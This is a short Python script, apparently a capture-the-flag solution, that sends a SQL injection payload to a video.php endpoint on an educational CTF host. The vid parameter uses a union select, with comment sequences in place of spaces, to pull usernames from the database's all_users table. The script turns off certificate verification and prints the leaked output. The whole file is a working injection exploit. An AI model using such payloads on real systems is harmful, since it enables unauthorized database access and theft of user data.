import requests 
  
# api-endpoint 
colName = []

URL = "https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,USERNAME,null/**/from/**/all_users"

r = requests.get(url = URL, verify=False) 
  
# data = r.status_code
output = r.text.splitlines()[-1]

print("\n" + URL)
# print(data)
print(output + "\n")

